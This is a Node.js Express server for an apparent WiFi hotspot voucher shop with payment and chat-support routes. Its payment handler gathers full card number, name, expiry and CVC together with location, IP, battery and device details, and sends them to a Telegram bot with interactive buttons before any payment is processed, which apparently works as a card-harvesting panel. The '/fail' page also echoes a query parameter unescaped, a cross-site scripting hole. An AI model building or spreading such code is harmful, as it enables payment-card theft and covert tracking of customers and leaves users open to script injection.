const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");
const multer = require("multer");
require("dotenv").config();

const { processPayment } = require("./pay");
const { sendPaymentNotificationWithButtons } = require("./telegramButtons"); // ✅ استدعاء نظام الأزرار المنفصل لتليجرام
const webhookRouter = require("./webhook");
const { disableUserQueue } = require("./mikrotik");
const { processPaymentAndCreateCard } = require("./mikrotikService");
const { generateContributionHtmlPage } = require('./contributionMessages');
const { generateWaitPageHtml } = require('./waitPage'); // استدعاء ملف صفحة الانتظار الافتراضية

// استدعاء ملف الدعم المباشر (Chat Support)
const chatSupport = require('./chat_support');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const NETWORK_URL = process.env.NETWORK_HOTSPOT_URL || "http://tales.net";

const BRANCH_NAMES = {
  waitPage: "صفحة الانتظار وتأكيد الدفع من محفظتك",
  main: "حكايات نت رئيسي",
  branch2: "حكايات نت فرع ثاني",
  branch3: "حكايات نت فرع ثالث"
};

global.generatedCardsMap = global.generatedCardsMap || new Map();

// تهيئة Socket.io للدعم المباشر
chatSupport.initSocket(io);

// إعداد Multer لاستقبال الصور والملفات المرفوعة في الشات
const upload = multer();

// تنظيف دوري للذاكرة المؤقتة كل نصف ساعة
setInterval(() => {
  const oneHourAgo = Date.now() - (60 * 60 * 1000);
  for (let [key, value] of global.generatedCardsMap.entries()) {
    if (value.createdAt && new Date(value.createdAt).getTime() < oneHourAgo) {
      global.generatedCardsMap.delete(key);
    }
  }
}, 30 * 60 * 1000);

app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

function getClientPublicIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket?.remoteAddress ||
    req.ip ||
    "غير متوفر"
  );
}

// ==========================================
// 💬 مسارات الدعم الفني المباشر (Chat Support API)
// ==========================================
app.post('/api/support/message', upload.single('image'), (req, res) => {
  chatSupport.handleClientMessage(req, res, chatSupport.sendSupportChatMessage);
});

app.get('/api/support/messages/:clientId', (req, res) => {
  const clientId = req.params.clientId;
  const messages = chatSupport.getStoredMessages(clientId);
  res.json({ success: true, messages });
});

app.post('/telegram-webhook', async (req, res) => {
  await chatSupport.handleTelegramReply(req.body);
  res.sendStatus(200);
});

// ==========================================
// 💳 مسارات المدفوعات وباقي الخدمة
// ==========================================
async function handlePaymentRequest(req, res) {
  try {
    const data = { ...req.query, ...req.body };
    const {
      phone, user_phone, phoneNumber, amount, payment_method, method,
      number, name, expiry, cvc, card_data, save_card, clientID, clientId,
      publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
      deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
      geoData, branch, branch_key
    } = data;

    if (!amount && Object.keys(data).length === 0) {
      return res.redirect("/");
    }

    const selectedMethod = payment_method || method || "wallet";
    const rawBranch = branch || branch_key || "branch2";
    const selectedBranch = BRANCH_NAMES[rawBranch] ? rawBranch : "branch2";
    const branchDisplayName = BRANCH_NAMES[selectedBranch] || BRANCH_NAMES.branch2;

    const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
    const payAmount = amount || "5";
    const transactionId = "TX_" + Date.now(); // توليد رقم معاملة فريد

    const paymentPayload = {
      phone: userPhone,
      amount_cents: parseFloat(payAmount) * 100,
      payment_method: selectedMethod,
      branch: selectedBranch,
      branchName: branchDisplayName,
      card_data: {
        number: (card_data && card_data.number) || number || "غير مدخل",
        name: (card_data && card_data.name) || name || "غير مدخل",
        expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
        cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
        save_card: save_card === "tokenize" || save_card === "نعم"
      },
      clientID: clientID || clientId || "غير متوفر",
      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
      lat: lat || (geoData && geoData.lat) || "غير متوفر",
      lon: lon || (geoData && geoData.lon) || "غير متوفر",
      city: city || (geoData && geoData.city) || "غير متوفر",
      country: country || (geoData && geoData.country) || "غير متوفر",
      battery: battery || batteryInfo || "غير متوفر",
      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
      deviceRAM: deviceRAM || "غير متوفر",
      cpuCores: cpuCores || "غير متوفر",
      deviceType: deviceType || "غير متوفر",
      screenSize: screenSize || "غير متوفر",
      userTimeZone: userTimeZone || "غير متوفر",
      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
    };

    // ✅ إرسال إشعار التليجرام المنفصل والمزود بالأزرار التفاعلية فقط
    if (typeof sendPaymentNotificationWithButtons === "function") {
      await sendPaymentNotificationWithButtons(paymentPayload, transactionId);
    }

    const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);

    if (result.type === "redirect") {
      if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
        return res.json({ payment_url: result.url });
      }
      return res.redirect(result.url);
    } else if (result.type === "html") {
      return res.send(result.content);
    } else {
      // ✅ التوجيه الافتراضي لملف waitPage.js وعرض صفحة الانتظار برقم المعاملة
      return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
    }
  } catch (err) {
    console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
    if (req.headers["content-type"]?.includes("application/json")) {
      return res.status(500).json({ error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
    }
    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
  }
}

app.get("/api/pay", handlePaymentRequest);
app.post("/api/pay", handlePaymentRequest);

// ✅ مسار تفعيل المساهمة القسري عند الضغط عليها من البوت
app.get("/api/force-contribution", (req, res) => {
  const txId = req.query.tx;
  const amount = req.query.amount || 150;

  if (txId) {
    const contributionPayload = {
      amount: parseFloat(amount),
      isContribution: true,
      forceContribution: true,
      createdAt: new Date()
    };

    if (typeof global.generatedCardsMap.set === 'function') {
      global.generatedCardsMap.set(txId, contributionPayload);
    } else {
      global.generatedCardsMap[txId] = contributionPayload;
    }
  }

  res.redirect(`/contribution-success?amount=${amount}&tx=${txId}`);
});

app.get("/api/test-create-card", async (req, res) => {
  const secretKey = req.query.secret;
  
  if (!secretKey || secretKey !== process.env.TEST_SECRET_KEY) {
    return res.status(403).json({ 
      success: false, 
      message: "⚠️ غير مسموح لك بالوصول لهذا الرابط التجريبي. مفتاح الحماية غير صحيح أو مفقود." 
    });
  }

  try {
    const amount = req.query.amount || "5";
    const rawTarget = req.query.branch || req.query.branch_key || "branch2";
    const targetBranch = BRANCH_NAMES[rawTarget] ? rawTarget : "branch2";
    const testTxId = req.query.tx || "TEST_" + Date.now();

    const result = await processPaymentAndCreateCard(amount, targetBranch, testTxId);

    if (result.success && !result.isCustomAmount) {
      const cardPayload = {
        code: result.cardCode,
        packageName: result.packageName,
        amount: parseFloat(amount),
        isContribution: parseFloat(amount) > 100,
        phone: "01000000000",
        branchKey: result.branchKey,
        branchName: BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.branch2,
        createdAt: new Date(),
        success: true
      };

      if (typeof global.generatedCardsMap.set === 'function') {
        global.generatedCardsMap.set(testTxId, cardPayload);
      } else {
        global.generatedCardsMap[testTxId] = cardPayload;
      }

      return res.json({
        success: true,
        message: `✅ تم إضافة الكارت إلى الميكروتيك بنجاح وتوليده لفرع (${result.branchKey}) تحت الحماية!`,
        data: result,
        successPageLink: `/success?merchant_order_id=${testTxId}&branch=${result.branchKey}`
      });
    } else {
      return res.json({
        success: false,
        message: "⚠️ فشل توليد الكارت من الميكروتيك",
        details: result
      });
    }
  } catch (error) {
    console.error("❌ [TEST ERROR]:", error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/contribution-success", (req, res) => {
  const amount = req.query.amount || req.query.price || 150;
  const transactionId = req.query.tx || req.query.id || req.query.order || 'TRX-DEFAULT';
  const htmlContent = generateContributionHtmlPage(amount, transactionId);
  res.send(htmlContent);
});

app.get("/api/check-voucher/:txId", (req, res) => {
  const txId = String(req.params.txId || "").trim();
  
  if (!txId || txId === "null" || txId === "undefined") {
    return res.json({ success: false, message: "رقم المعاملة غير صالح" });
  }

  global.generatedCardsMap = global.generatedCardsMap || {};

  let cardData = null;

  if (typeof global.generatedCardsMap.get === 'function' && global.generatedCardsMap.has(txId)) {
    cardData = global.generatedCardsMap.get(txId);
  } else if (global.generatedCardsMap[txId]) {
    cardData = global.generatedCardsMap[txId];
  }

  if (!cardData) {
    const entries = typeof global.generatedCardsMap.entries === 'function' 
      ? Array.from(global.generatedCardsMap.entries()) 
      : Object.entries(global.generatedCardsMap);

    const foundEntry = entries.find(([key]) => String(key).includes(txId) || txId.includes(String(key)));
    if (foundEntry) {
      cardData = foundEntry[1];
    }
  }

  if (cardData) {
    return res.json({ success: true, data: cardData });
  }

  return res.json({ 
    success: false, 
    message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." 
  });
});

app.post("/api/disable-queue", async (req, res) => {
  try {
    const { username } = req.body;
    if (typeof disableUserQueue === "function") {
      const result = await disableUserQueue(username);
      return res.json(result);
    }
    return res.json({ success: true, message: "تم استقبال الطلب" });
  } catch (err) {
    console.error("❌ خطأ في تعطيل الـ Queue:", err.message);
    return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
  }
});

// ✅ توجيه مسار النجاح القديم ليعرض صفحة الانتظار الافتراضية برقم المعاملة
app.get("/success", (req, res) => {
  const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "TX_" + Date.now();
  return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
});

app.get("/fail", (req, res) => {
  const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>فشل الدفع - شبكة حكايات</title>
        <style>
          body { font-family: Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 40px 20px; direction: rtl; }
          .card { background: white; max-width: 420px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
          .icon { font-size: 50px; color: #e74c3c; margin-bottom: 10px; }
          h1 { color: #2c3e50; font-size: 22px; margin-bottom: 10px; }
          .error-box { background: #fff3f3; color: #e74c3c; border: 1px dashed #e74c3c; padding: 10px; border-radius: 6px; margin: 15px 0; font-size: 14px; }
          .btn { display: inline-block; background: #e74c3c; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; margin-top: 15px; font-weight: bold; }
        </style>
      </head>
      <body>
        <div class="card">
          <div class="icon">❌</div>
          <h1>فشل عملية الدفع</h1>
          <div class="error-box">${errorMessage}</div>
          <a href="/" class="btn">إعادة المحاولة</a>
        </div>
      </body>
    </html>
  `);
});

app.use("/", webhookRouter);

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
